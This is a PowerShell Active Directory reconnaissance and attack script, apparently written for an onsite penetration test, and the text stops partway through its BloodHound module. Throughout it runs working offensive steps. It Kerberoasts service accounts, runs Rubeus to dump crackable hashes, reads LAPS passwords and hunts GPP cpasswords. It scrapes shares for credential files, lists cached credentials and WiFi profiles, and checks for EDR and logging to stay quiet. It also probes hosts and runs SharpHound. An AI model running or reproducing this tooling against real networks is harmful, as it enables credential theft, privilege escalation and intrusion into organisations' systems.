<#
.SYNOPSIS
    AD Internal Recon - Windows Native (No External Tools Required)
.DESCRIPTION
    Master enumeration script for AD pentesting from a domain-joined
    Windows workstation with low-privilege domain user access.
    
    Uses ONLY:
      - Native PowerShell / .NET (DirectorySearcher)
      - Built-in Windows commands (net, nltest, whoami, etc.)
      - Optional: PowerView.ps1, SharpHound.exe, Rubeus.exe (if available on USB)
    
    NO admin rights required. NO tool installation.
    
.NOTES
    AUTHORIZED TESTING ONLY — MCX Onsite Engagement
    Run from: PowerShell (bypass execution policy)
    Launch:   powershell -ep bypass -File .\ad_recon_win.ps1
#>

# ========================== CONFIGURATION ==========================
# These auto-detect from the domain-joined machine — override if needed
$Domain       = $env:USERDNSDOMAIN
$Username     = $env:USERNAME
$ComputerName = $env:COMPUTERNAME
$LogonServer  = ($env:LOGONSERVER -replace '\\\\','')
$Timestamp    = Get-Date -Format "yyyyMMdd_HHmmss"
$BaseDir      = "$env:USERPROFILE\Desktop\recon_$Timestamp"

# Optional: Path to portable tools (USB drive, etc.)
# Set to $null if not available — script works without them
$ToolsPath    = $null   # e.g., "E:\tools"
# ===================================================================

# ========================== HELPERS ==========================

function Write-Banner($msg) {
    Write-Host ""
    Write-Host "[*]============================================" -ForegroundColor Cyan
    Write-Host "[*] $msg" -ForegroundColor Cyan
    Write-Host "[*]============================================" -ForegroundColor Cyan
    Write-Host ""
}

function Write-Info($msg)  { Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Warn($msg)  { Write-Host "[!] $msg" -ForegroundColor Yellow }
function Write-Fail($msg)  { Write-Host "[-] $msg" -ForegroundColor Red }

function Save-Output($Name, $Content, $SubDir = "enumeration") {
    $outPath = Join-Path $BaseDir $SubDir
    if (-not (Test-Path $outPath)) { New-Item -ItemType Directory -Path $outPath -Force | Out-Null }
    $filePath = Join-Path $outPath $Name
    $Content | Out-File -FilePath $filePath -Encoding UTF8
    Write-Info "Saved -> $filePath"
}

function Get-LDAPSearcher {
    param(
        [string]$Filter,
        [string[]]$Properties = @("*"),
        [string]$SearchBase = $null
    )
    # Uses .NET DirectorySearcher — works without any modules
    # Runs as current authenticated domain user automatically
    try {
        if ($SearchBase) {
            $entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$SearchBase")
        } else {
            $entry = New-Object System.DirectoryServices.DirectoryEntry
        }
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($entry)
        $searcher.Filter = $Filter
        $searcher.PageSize = 1000
        foreach ($prop in $Properties) {
            $searcher.PropertiesToLoad.Add($prop) | Out-Null
        }
        return $searcher.FindAll()
    } catch {
        Write-Warn "LDAP query failed: $_"
        return $null
    }
}

function Setup-Directories {
    $dirs = @("enumeration","credentials","access","bloodhound","shares","lateral","privesc","localrecon")
    foreach ($d in $dirs) {
        New-Item -ItemType Directory -Path (Join-Path $BaseDir $d) -Force | Out-Null
    }
    Write-Info "Output directory: $BaseDir"
}

# ========================== MODULE 0: LOCAL SITUATIONAL AWARENESS ==========================

function Mod-LocalRecon {
    Write-Banner "MODULE 0: Local Machine Situational Awareness"
    
    $results = @()
    $results += "=== WHO AM I ==="
    $results += (whoami /all 2>&1 | Out-String)
    Save-Output "whoami_all.txt" $results "localrecon"

    # Current privileges and group memberships
    $results2 = @()
    $results2 += "=== CURRENT USER CONTEXT ==="
    $results2 += "User       : $env:USERNAME"
    $results2 += "Domain     : $env:USERDNSDOMAIN"
    $results2 += "Computer   : $env:COMPUTERNAME"
    $results2 += "LogonServer: $env:LOGONSERVER"
    $results2 += ""
    $results2 += "=== NETWORK CONFIG ==="
    $results2 += (ipconfig /all 2>&1 | Out-String)
    Save-Output "system_info.txt" $results2 "localrecon"

    # DNS info — reveals other DCs, servers
    Write-Info "Extracting DNS configuration"
    $dns = @()
    $dns += "=== DNS CACHE (reveals recently resolved hosts) ==="
    $dns += (ipconfig /displaydns 2>&1 | Select-String "Record Name" | Out-String)
    $dns += ""
    $dns += "=== DNS SERVERS ==="
    $dns += (Get-DnsClientServerAddress -ErrorAction SilentlyContinue | Out-String)
    Save-Output "dns_info.txt" $dns "localrecon"

    # Cached credentials / stored creds
    Write-Info "Checking stored credentials"
    $creds = @()
    $creds += "=== STORED CREDENTIALS (cmdkey) ==="
    $creds += (cmdkey /list 2>&1 | Out-String)
    $creds += ""
    $creds += "=== KERBEROS TICKETS ==="
    $creds += (klist 2>&1 | Out-String)
    Save-Output "cached_credentials.txt" $creds "localrecon"

    # Network connections — what's this box talking to
    Write-Info "Capturing active network connections"
    $netstat = netstat -ano 2>&1 | Out-String
    Save-Output "netstat.txt" $netstat "localrecon"

    # Installed software (might reveal security tools, AV)
    Write-Info "Checking installed software and AV"
    $sw = @()
    $sw += "=== RUNNING PROCESSES ==="
    $sw += (tasklist /v 2>&1 | Out-String)
    $sw += ""
    $sw += "=== AV / EDR CHECK ==="
    $avProcesses = @("MsMpEng","CylanceSvc","CrowdStrike","CSFalcon","csfalconservice",
                     "SentinelAgent","SentinelOne","TaniumClient","CarbonBlack",
                     "cb","RepMgr","WildfireSvc","Traps","xagt","FireEye")
    $running = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
    foreach ($av in $avProcesses) {
        if ($running -match $av) {
            $sw += "  [!] DETECTED: $av"
        }
    }
    $sw += ""
    $sw += "=== WINDOWS DEFENDER STATUS ==="
    try {
        $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
        $sw += "  RealTimeProtection : $($defender.RealTimeProtectionEnabled)"
        $sw += "  AntivirusEnabled   : $($defender.AntivirusEnabled)"
        $sw += "  AMSIEnabled        : Check via registry"
    } catch {
        $sw += "  Could not query Defender status"
    }
    Save-Output "software_av.txt" $sw "localrecon"

    # PowerShell logging — know what's being watched
    Write-Info "Checking PowerShell security settings"
    $psec = @()
    $psec += "=== POWERSHELL LOGGING ==="
    $psec += "LanguageMode     : $($ExecutionContext.SessionState.LanguageMode)"
    $psec += "PS Version       : $($PSVersionTable.PSVersion)"
    try {
        $scriptBlock = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue).EnableScriptBlockLogging
        $moduleLog   = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -ErrorAction SilentlyContinue).EnableModuleLogging
        $transcript  = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue).EnableTranscripting
        $psec += "ScriptBlockLog   : $scriptBlock"
        $psec += "ModuleLogging    : $moduleLog"
        $psec += "Transcription    : $transcript"
    } catch {
        $psec += "  Could not read logging registry keys"
    }
    $psec += ""
    $psec += "=== APPLOCKER / CONSTRAINED LANGUAGE ==="
    $psec += "LanguageMode: $($ExecutionContext.SessionState.LanguageMode)"
    Save-Output "ps_security.txt" $psec "localrecon"
}

# ========================== MODULE 1: DOMAIN VALIDATION ==========================

function Mod-Validate {
    Write-Banner "MODULE 1: Domain Connectivity Validation"

    $results = @()
    
    # Confirm domain membership
    Write-Info "Validating domain membership"
    $results += "=== DOMAIN INFO ==="
    $results += "Domain   : $Domain"
    $results += "User     : $Username"
    $results += "DC       : $LogonServer"
    $results += ""

    # Find all DCs
    Write-Info "Discovering Domain Controllers"
    $results += "=== DOMAIN CONTROLLERS ==="
    $results += (nltest /dclist:$Domain 2>&1 | Out-String)
    $results += ""

    # Domain trusts
    Write-Info "Enumerating domain trusts"
    $results += "=== DOMAIN TRUSTS ==="
    $results += (nltest /domain_trusts /all_trusts 2>&1 | Out-String)
    $results += ""

    # LDAP connectivity test
    Write-Info "Testing LDAP via .NET DirectorySearcher"
    try {
        $testResult = Get-LDAPSearcher -Filter "(objectClass=domain)" -Properties @("distinguishedName","name")
        if ($testResult) {
            $results += "LDAP Bind: SUCCESS"
            foreach ($r in $testResult) {
                $results += "  DN: $($r.Properties['distinguishedname'][0])"
            }
            Write-Info "LDAP connectivity confirmed"
        }
    } catch {
        $results += "LDAP Bind: FAILED"
        Write-Fail "LDAP failed — enumeration may be limited"
    }

    Save-Output "domain_validation.txt" $results
}

# ========================== MODULE 2: AD ENUMERATION ==========================

function Mod-Enumerate {
    Write-Banner "MODULE 2: Active Directory Enumeration"

    # --- Domain Admins ---
    Write-Info "Enumerating Domain Admins"
    $daMembers = @()
    $daMembers += "=== DOMAIN ADMINS ==="
    try {
        $daResults = Get-LDAPSearcher -Filter "(&(objectClass=group)(cn=Domain Admins))" -Properties @("member")
        foreach ($r in $daResults) {
            $members = $r.Properties["member"]
            foreach ($m in $members) {
                $daMembers += "  $m"
            }
        }
    } catch { $daMembers += "  Query failed" }
    Save-Output "domain_admins.txt" $daMembers

    # --- Enterprise Admins ---
    Write-Info "Enumerating Enterprise Admins"
    $eaMembers = @()
    $eaMembers += "=== ENTERPRISE ADMINS ==="
    try {
        $eaResults = Get-LDAPSearcher -Filter "(&(objectClass=group)(cn=Enterprise Admins))" -Properties @("member")
        foreach ($r in $eaResults) {
            $members = $r.Properties["member"]
            foreach ($m in $members) {
                $eaMembers += "  $m"
            }
        }
    } catch { $eaMembers += "  Query failed" }
    Save-Output "enterprise_admins.txt" $eaMembers

    # --- All privileged groups ---
    Write-Info "Enumerating high-value groups"
    $privGroups = @("Domain Admins","Enterprise Admins","Schema Admins",
                    "Account Operators","Server Operators","Backup Operators",
                    "DnsAdmins","Group Policy Creator Owners",
                    "Remote Desktop Users","Remote Management Users")
    $groupResults = @()
    foreach ($grp in $privGroups) {
        $groupResults += "=== $grp ==="
        try {
            $grpSearch = Get-LDAPSearcher -Filter "(&(objectClass=group)(cn=$grp))" -Properties @("member")
            foreach ($r in $grpSearch) {
                $members = $r.Properties["member"]
                if ($members.Count -eq 0) {
                    $groupResults += "  (empty)"
                } else {
                    foreach ($m in $members) {
                        $groupResults += "  $m"
                    }
                }
            }
        } catch { $groupResults += "  Query failed" }
        $groupResults += ""
    }
    Save-Output "privileged_groups.txt" $groupResults

    # --- Service Accounts (SPNs) — Kerberoast targets ---
    Write-Info "Enumerating SPN accounts (Kerberoast targets)"
    $spnResults = @()
    $spnResults += "=== SERVICE ACCOUNTS WITH SPNs ==="
    try {
        $spnSearch = Get-LDAPSearcher -Filter "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" `
                        -Properties @("sAMAccountName","servicePrincipalName","memberOf","pwdLastSet","description")
        foreach ($r in $spnSearch) {
            $spnResults += "Account    : $($r.Properties['samaccountname'][0])"
            $spns = $r.Properties['serviceprincipalname']
            foreach ($s in $spns) {
                $spnResults += "  SPN      : $s"
            }
            $spnResults += "  MemberOf : $($r.Properties['memberof'] -join ', ')"
            $spnResults += "  PwdSet   : $([datetime]::FromFileTime([long]$r.Properties['pwdlastset'][0]))"
            $spnResults += "  Desc     : $($r.Properties['description'][0])"
            $spnResults += ""
        }
    } catch { $spnResults += "  Query failed" }
    Save-Output "spn_accounts.txt" $spnResults

    # --- Users with no Kerberos pre-auth (AS-REP targets) ---
    Write-Info "Enumerating AS-REP roastable accounts"
    $asrepResults = @()
    $asrepResults += "=== ACCOUNTS WITHOUT PRE-AUTH (AS-REP TARGETS) ==="
    try {
        $asrepSearch = Get-LDAPSearcher -Filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" `
                        -Properties @("sAMAccountName","distinguishedName")
        foreach ($r in $asrepSearch) {
            $asrepResults += "  $($r.Properties['samaccountname'][0])"
        }
        if ($asrepSearch.Count -eq 0) { $asrepResults += "  None found" }
    } catch { $asrepResults += "  Query failed" }
    Save-Output "asrep_candidates.txt" $asrepResults

    # --- Delegation ---
    Write-Info "Checking delegation configurations"
    $delegResults = @()

    # Unconstrained delegation
    $delegResults += "=== UNCONSTRAINED DELEGATION ==="
    try {
        $uncon = Get-LDAPSearcher -Filter "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" `
                    -Properties @("cn","dNSHostName")
        foreach ($r in $uncon) {
            $delegResults += "  $($r.Properties['cn'][0]) - $($r.Properties['dnshostname'][0])"
        }
        if ($uncon.Count -eq 0) { $delegResults += "  None found" }
    } catch { $delegResults += "  Query failed" }

    $delegResults += ""

    # Constrained delegation
    $delegResults += "=== CONSTRAINED DELEGATION ==="
    try {
        $con = Get-LDAPSearcher -Filter "(msDS-AllowedToDelegateTo=*)" `
                -Properties @("sAMAccountName","msDS-AllowedToDelegateTo")
        foreach ($r in $con) {
            $delegResults += "  $($r.Properties['samaccountname'][0])"
            $targets = $r.Properties['msds-allowedtodelegateto']
            foreach ($t in $targets) {
                $delegResults += "    -> $t"
            }
        }
        if ($con.Count -eq 0) { $delegResults += "  None found" }
    } catch { $delegResults += "  Query failed" }

    $delegResults += ""

    # Resource-based constrained delegation
    $delegResults += "=== RESOURCE-BASED CONSTRAINED DELEGATION ==="
    try {
        $rbcd = Get-LDAPSearcher -Filter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" `
                -Properties @("sAMAccountName","msDS-AllowedToActOnBehalfOfOtherIdentity")
        foreach ($r in $rbcd) {
            $delegResults += "  $($r.Properties['samaccountname'][0])"
        }
        if ($rbcd.Count -eq 0) { $delegResults += "  None found" }
    } catch { $delegResults += "  Query failed" }

    Save-Output "delegation.txt" $delegResults

    # --- Computers with OS info ---
    Write-Info "Enumerating domain computers"
    $compResults = @()
    $compResults += "=== DOMAIN COMPUTERS ==="
    try {
        $compSearch = Get-LDAPSearcher -Filter "(objectClass=computer)" `
                        -Properties @("cn","dNSHostName","operatingSystem","operatingSystemVersion","lastLogonTimestamp")
        foreach ($r in $compSearch) {
            $lastLogon = ""
            try { $lastLogon = [datetime]::FromFileTime([long]$r.Properties['lastlogontimestamp'][0]).ToString("yyyy-MM-dd") } catch {}
            $compResults += "$($r.Properties['cn'][0]) | $($r.Properties['operatingsystem'][0]) | $($r.Properties['dnshostname'][0]) | LastLogon: $lastLogon"
        }
    } catch { $compResults += "  Query failed" }
    Save-Output "domain_computers.txt" $compResults

    # --- Password policy ---
    Write-Info "Retrieving password policy"
    $pwdPol = @()
    $pwdPol += "=== PASSWORD POLICY ==="
    $pwdPol += (net accounts /domain 2>&1 | Out-String)
    Save-Output "password_policy.txt" $pwdPol

    # --- Recently created / modified accounts (interesting for persistence) ---
    Write-Info "Checking recently created user accounts"
    $recentUsers = @()
    $recentUsers += "=== USERS CREATED IN LAST 30 DAYS ==="
    try {
        $thirtyDaysAgo = (Get-Date).AddDays(-30).ToFileTime()
        $recent = Get-LDAPSearcher -Filter "(&(objectClass=user)(whenCreated>=$((Get-Date).AddDays(-30).ToString('yyyyMMddHHmmss.0Z'))))" `
                    -Properties @("sAMAccountName","whenCreated","description")
        foreach ($r in $recent) {
            $recentUsers += "  $($r.Properties['samaccountname'][0]) | Created: $($r.Properties['whencreated'][0])"
        }
        if ($recent.Count -eq 0) { $recentUsers += "  None found" }
    } catch { $recentUsers += "  Query failed" }
    Save-Output "recent_users.txt" $recentUsers
}

# ========================== MODULE 3: KERBEROASTING (NATIVE) ==========================

function Mod-Kerberoast {
    Write-Banner "MODULE 3: Kerberoasting (Native — No Tools)"

    $outdir = Join-Path $BaseDir "credentials"

    # Request TGS tickets for all SPN accounts using .NET
    # This is 100% native — just requesting service tickets
    Write-Info "Requesting TGS tickets for SPN accounts via .NET"
    
    $ticketResults = @()
    $ticketResults += "=== KERBEROAST — TGS TICKETS REQUESTED ==="
    $ticketResults += "Method: Native .NET (System.IdentityModel.Tokens.KerberosRequestorSecurityToken)"
    $ticketResults += ""

    try {
        Add-Type -AssemblyName System.IdentityModel -ErrorAction Stop
        
        $spnSearch = Get-LDAPSearcher -Filter "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" `
                        -Properties @("sAMAccountName","servicePrincipalName")

        $ticketCount = 0
        foreach ($r in $spnSearch) {
            $account = $r.Properties['samaccountname'][0]
            $spn = $r.Properties['serviceprincipalname'][0]
            
            try {
                $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
                $ticketBytes = $ticket.GetRequest()
                
                # Extract the ticket and convert to hashcat format
                $hex = [System.BitConverter]::ToString($ticketBytes) -replace '-',''
                
                $ticketResults += "Account: $account"
                $ticketResults += "SPN    : $spn"
                $ticketResults += "Ticket : (captured - $($ticketBytes.Length) bytes)"
                $ticketResults += ""
                $ticketCount++
                
                Write-Info "  TGS captured: $account ($spn)"
            } catch {
                $ticketResults += "Account: $account — FAILED: $_"
                $ticketResults += ""
            }
        }
        
        $ticketResults += ""
        $ticketResults += "Total TGS tickets captured: $ticketCount"
        
    } catch {
        $ticketResults += "System.IdentityModel not available — use Rubeus if on USB"
        Write-Warn "Native Kerberoast failed — IdentityModel not loaded"
    }

    Save-Output "kerberoast_native.txt" $ticketResults "credentials"

    # Also export current tickets from memory
    Write-Info "Exporting current Kerberos tickets"
    $currentTickets = klist 2>&1 | Out-String
    Save-Output "klist_current.txt" $currentTickets "credentials"

    # If Rubeus is available on USB, use it for proper hash extraction
    if ($ToolsPath -and (Test-Path "$ToolsPath\Rubeus.exe")) {
        Write-Info "Rubeus found on portable media — running Kerberoast with hashcat output"
        $rubeusOut = & "$ToolsPath\Rubeus.exe" kerberoast /format:hashcat /outfile:"$outdir\kerberoast_hashes.txt" 2>&1 | Out-String
        Save-Output "rubeus_kerberoast.txt" $rubeusOut "credentials"
        
        Write-Info "Running AS-REP roast via Rubeus"
        $asrepOut = & "$ToolsPath\Rubeus.exe" asreproast /format:hashcat /outfile:"$outdir\asrep_hashes.txt" 2>&1 | Out-String
        Save-Output "rubeus_asrep.txt" $asrepOut "credentials"
    } else {
        Write-Warn "No Rubeus on portable media — native TGS request only (no hashcat format)"
        Write-Warn "Transfer tickets offline for extraction, or bring Rubeus next time"
    }
}

# ========================== MODULE 4: ACCESS MAPPING ==========================

function Mod-AccessMap {
    Write-Banner "MODULE 4: Network Access Mapping"

    $outdir = Join-Path $BaseDir "access"

    # Get list of domain computers from our enumeration
    $computerFile = Join-Path $BaseDir "enumeration\domain_computers.txt"
    
    # Quick port check on common targets (445, 5985, 3389) using .NET sockets
    # This is much quieter than nmap
    Write-Info "Testing SMB/WinRM/RDP reachability via .NET socket probes"
    
    $accessResults = @()
    $accessResults += "=== ACCESS MAP ==="
    $accessResults += "Format: Host | SMB(445) | WinRM(5985) | RDP(3389)"
    $accessResults += ""

    # Extract hostnames from computer enumeration
    $targets = @()
    if (Test-Path $computerFile) {
        $targets = Get-Content $computerFile | 
            Where-Object { $_ -match '\|' } | 
            ForEach-Object { ($_ -split '\|')[2].Trim() } |
            Where-Object { $_ -and $_ -ne '' }
    }

    if ($targets.Count -eq 0) {
        Write-Warn "No targets from enumeration — falling back to net view"
        $targets = (net view /domain:$Domain 2>&1 | 
            Select-String '\\\\' | 
            ForEach-Object { ($_ -replace '\\\\','').Trim().Split()[0] })
    }

    # Limit to first 30 hosts to stay quiet
    $targets = $targets | Select-Object -First 30

    foreach ($host in $targets) {
        if (-not $host -or $host -match '===') { continue }
        
        $smb = $false; $winrm = $false; $rdp = $false
        
        # SMB 445
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $result = $tcp.BeginConnect($host, 445, $null, $null)
            $success = $result.AsyncWaitHandle.WaitOne(500)
            if ($success) { $smb = $true }
            $tcp.Close()
        } catch {}

        # WinRM 5985
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $result = $tcp.BeginConnect($host, 5985, $null, $null)
            $success = $result.AsyncWaitHandle.WaitOne(500)
            if ($success) { $winrm = $true }
            $tcp.Close()
        } catch {}

        # RDP 3389
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $result = $tcp.BeginConnect($host, 3389, $null, $null)
            $success = $result.AsyncWaitHandle.WaitOne(500)
            if ($success) { $rdp = $true }
            $tcp.Close()
        } catch {}

        $line = "$host | SMB:$smb | WinRM:$winrm | RDP:$rdp"
        $accessResults += $line
        
        if ($smb -or $winrm) {
            Write-Info "  $line"
        }
    }

    Save-Output "access_map.txt" $accessResults "access"
}

# ========================== MODULE 5: SHARE ENUMERATION ==========================

function Mod-Shares {
    Write-Banner "MODULE 5: SMB Share Enumeration & Sensitive File Discovery"

    $outdir = Join-Path $BaseDir "shares"
    
    # Enumerate shares on all reachable SMB hosts
    $accessFile = Join-Path $BaseDir "access\access_map.txt"
    $smbHosts = @()
    
    if (Test-Path $accessFile) {
        $smbHosts = Get-Content $accessFile | 
            Where-Object { $_ -match 'SMB:True' } | 
            ForEach-Object { ($_ -split '\|')[0].Trim() }
    }

    if ($smbHosts.Count -eq 0) {
        Write-Warn "No SMB hosts found — attempting net view"
        $smbHosts = @($LogonServer)
    }

    $shareResults = @()
    $shareResults += "=== ACCESSIBLE SHARES ==="
    $shareResults += ""

    $interestingFiles = @()
    $interestingFiles += "=== INTERESTING FILES ON SHARES ==="
    $interestingFiles += ""

    # Interesting file patterns
    $filePatterns = @("*.config","*.xml","*.ini","*.conf","*.txt","*.ps1","*.bat",
                      "*pass*","*cred*","*secret*","*key*","*.pfx","*.pem",
                      "*unattend*","*sysprep*","*.kdbx","*.rdg","web.config",
                      "*.rdp","*.vnc","*.pgpass","*history*")

    foreach ($h in ($smbHosts | Select-Object -First 15)) {
        Write-Info "Enumerating shares on $h"
        $shareResults += "--- $h ---"
        
        try {
            $shares = net view "\\$h" /all 2>&1 | Out-String
            $shareResults += $shares
            
            # Parse share names and check for accessible non-default shares
            $shareNames = $shares -split "`n" | 
                Where-Object { $_ -match '^\s*\S+\s+Disk' } | 
                ForEach-Object { ($_ -split '\s+')[0] } |
                Where-Object { $_ -notin @('ADMIN$','C$','IPC$','print$','SYSVOL','NETLOGON') }

            foreach ($share in $shareNames) {
                if (-not $share) { continue }
                Write-Info "  Checking \\$h\$share for interesting files"
                
                try {
                    # List top-level contents
                    $items = Get-ChildItem "\\$h\$share" -ErrorAction Stop | Select-Object -First 50
                    foreach ($item in $items) {
                        $interestingFiles += "  \\$h\$share\$($item.Name) [$($item.Length) bytes]"
                    }
                    
                    # Search for interesting files (1 level deep to stay quiet)
                    foreach ($pattern in $filePatterns) {
                        $found = Get-ChildItem "\\$h\$share" -Filter $pattern -Recurse -Depth 2 -ErrorAction SilentlyContinue | 
                            Select-Object -First 5
                        foreach ($f in $found) {
                            $interestingFiles += "  [!] $($f.FullName) [$($f.Length) bytes]"
                        }
                    }
                } catch {
                    $interestingFiles += "  \\$h\$share — ACCESS DENIED or error"
                }
            }
        } catch {
            $shareResults += "  Error enumerating: $_"
        }
        $shareResults += ""
    }

    Save-Output "all_shares.txt" $shareResults "shares"
    Save-Output "interesting_files.txt" $interestingFiles "shares"

    # --- SYSVOL/GPP check (can contain legacy passwords) ---
    Write-Info "Checking SYSVOL for GPP passwords (Groups.xml)"
    $gppResults = @()
    $gppResults += "=== GPP PASSWORD CHECK ==="
    try {
        $gppFiles = Get-ChildItem "\\$Domain\SYSVOL\$Domain\Policies" -Recurse -Filter "Groups.xml" -ErrorAction SilentlyContinue
        foreach ($g in $gppFiles) {
            $gppResults += "  FOUND: $($g.FullName)"
            $content = Get-Content $g.FullName -ErrorAction SilentlyContinue
            if ($content -match 'cpassword') {
                $gppResults += "  [!!!] Contains cpassword — GPP password found!"
            }
        }
        if ($gppFiles.Count -eq 0) { $gppResults += "  No Groups.xml found in SYSVOL" }

        # Also check for other interesting GPP files
        $gppOther = Get-ChildItem "\\$Domain\SYSVOL\$Domain\Policies" -Recurse -Include @("*.xml","*.ini","*.bat","*.ps1") -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match '(scheduledtasks|services|datasources|drives|printers)' } |
            Select-Object -First 20
        foreach ($f in $gppOther) {
            $gppResults += "  GPP Config: $($f.FullName)"
        }
    } catch {
        $gppResults += "  Could not access SYSVOL"
    }
    Save-Output "gpp_check.txt" $gppResults "shares"
}

# ========================== MODULE 6: PRIVESC CHECKS ==========================

function Mod-PrivEsc {
    Write-Banner "MODULE 6: Privilege Escalation Checks"

    $outdir = Join-Path $BaseDir "privesc"
    $privResults = @()

    # --- Check if current user is in any interesting groups ---
    Write-Info "Checking current user group memberships for privesc"
    $privResults += "=== CURRENT USER GROUPS ==="
    $privResults += (whoami /groups /fo list 2>&1 | Out-String)
    $privResults += ""

    # --- LAPS check ---
    Write-Info "Checking for LAPS (readable passwords)"
    $lapsResults = @()
    $lapsResults += "=== LAPS CHECK ==="
    try {
        $laps = Get-LDAPSearcher -Filter "(ms-Mcs-AdmPwd=*)" -Properties @("cn","ms-Mcs-AdmPwd","ms-Mcs-AdmPwdExpirationTime")
        foreach ($r in $laps) {
            $lapsResults += "  HOST: $($r.Properties['cn'][0]) | PASSWORD: $($r.Properties['ms-mcs-admpwd'][0])"
        }
        if ($laps.Count -eq 0) { $lapsResults += "  No readable LAPS passwords (may not be deployed or no access)" }
    } catch { $lapsResults += "  Query failed" }
    Save-Output "laps_check.txt" $lapsResults "privesc"

    # --- ADCS Check ---
    Write-Info "Checking for AD Certificate Services"
    $adcsResults = @()
    $adcsResults += "=== AD CERTIFICATE SERVICES ==="
    try {
        $configDN = "CN=Configuration," + ($Domain -split '\.' | ForEach-Object { "DC=$_" }) -join ','
        $adcs = Get-LDAPSearcher -Filter "(objectClass=pKIEnrollmentService)" `
                    -Properties @("cn","dNSHostName","certificateTemplates") `
                    -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN"
        foreach ($r in $adcs) {
            $adcsResults += "  CA: $($r.Properties['cn'][0]) on $($r.Properties['dnshostname'][0])"
            $templates = $r.Properties['certificatetemplates']
            $adcsResults += "  Templates: $($templates.Count) enrolled"
            foreach ($t in ($templates | Select-Object -First 10)) {
                $adcsResults += "    - $t"
            }
        }
        if ($adcs.Count -eq 0) { $adcsResults += "  No ADCS found" }
    } catch { $adcsResults += "  Query failed — try certutil -config - -ping" }
    
    # Also try certutil
    $adcsResults += ""
    $adcsResults += "=== CERTUTIL CA CHECK ==="
    $adcsResults += (certutil -config - -ping 2>&1 | Out-String)
    Save-Output "adcs_check.txt" $adcsResults "privesc"

    # --- Check for writable AD attributes (RBCD, etc.) ---
    Write-Info "Checking machine account quota (for RBCD attacks)"
    $privResults += "=== MACHINE ACCOUNT QUOTA ==="
    try {
        $maq = Get-LDAPSearcher -Filter "(objectClass=domain)" -Properties @("ms-DS-MachineAccountQuota")
        foreach ($r in $maq) {
            $quota = $r.Properties['ms-ds-machineaccountquota'][0]
            $privResults += "  MachineAccountQuota: $quota"
            if ([int]$quota -gt 0) {
                $privResults += "  [!] Non-zero quota — RBCD attack may be possible"
            }
        }
    } catch { $privResults += "  Query failed" }

    # --- Local privilege checks ---
    $privResults += ""
    $privResults += "=== LOCAL PRIVILEGE CHECKS ==="
    
    # Unquoted service paths
    $privResults += ""
    $privResults += "--- Unquoted Service Paths ---"
    try {
        $services = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | 
            Where-Object { $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch 'System32' }
        foreach ($svc in $services) {
            $privResults += "  $($svc.Name): $($svc.PathName) [StartMode: $($svc.StartMode)]"
        }
        if (-not $services) { $privResults += "  None found" }
    } catch { $privResults += "  WMI query failed" }

    # AlwaysInstallElevated
    $privResults += ""
    $privResults += "--- AlwaysInstallElevated ---"
    try {
        $hklm = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
        $hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
        if ($hklm -eq 1 -and $hkcu -eq 1) {
            $privResults += "  [!!!] AlwaysInstallElevated is ENABLED — trivial privesc"
        } else {
            $privResults += "  Not enabled"
        }
    } catch { $privResults += "  Could not check" }

    # Stored WiFi passwords
    $privResults += ""
    $privResults += "--- Stored WiFi Profiles ---"
    $privResults += (netsh wlan show profiles 2>&1 | Out-String)

    # Scheduled tasks
    $privResults += ""
    $privResults += "--- Writable Scheduled Task Paths ---"
    try {
        $tasks = schtasks /query /fo CSV /v 2>&1 | ConvertFrom-Csv -ErrorAction SilentlyContinue |
            Where-Object { $_.'Task To Run' -and $_.'Task To Run' -notmatch 'COM handler|System32' } |
            Select-Object -First 20
        foreach ($t in $tasks) {
            $privResults += "  $($_.'TaskName') -> $($_.'Task To Run')"
        }
    } catch { $privResults += "  Could not enumerate" }

    Save-Output "privesc_checks.txt" $privResults "privesc"
}

# ========================== MODULE 7: BLOODHOUND (IF AVAILABLE) ==========================

function Mod-BloodHound {
    Write-Banner "MODULE 7: BloodHound Collection (Portable)"

    $outdir = Join-Path $BaseDir "bloodhound"

    if ($ToolsPath -and (Test-Path "$ToolsPath\SharpHound.exe")) {
        Write-Info "SharpHound found — running collection"
        & "$ToolsPath\SharpHound.exe" --collectionmethods All --outputdirectory "$outdir" --zipfilename "bloodhound_data.zip" 2>&1 | 
            Tee-Object -FilePath "$outdir\sharphound_log.txt"
        
        $zips = Get-ChildItem $outdir -Filter "*.zip"
        if ($zips) {
            Write-Info "BloodHound data collected: $($zips.Name)"
        }
    } elseif ($ToolsPath -and (Test-Path "$ToolsPath\SharpHound.ps1")) {
        Write-Info "SharpHound.ps1 found — importing and running"
        Import-Module "$ToolsPath\SharpHound.ps1" -ErrorAction SilentlyContinue
        Invoke-BloodHound -CollectionMethod All -OutputDirectory $outdir -ZipFileName "bloodhound_data.zip" 2>&1 |
            Tee-Object -FilePath "$outdir\sharphound_log.txt"
    } else {
        Write-Warn "No SharpHound available"
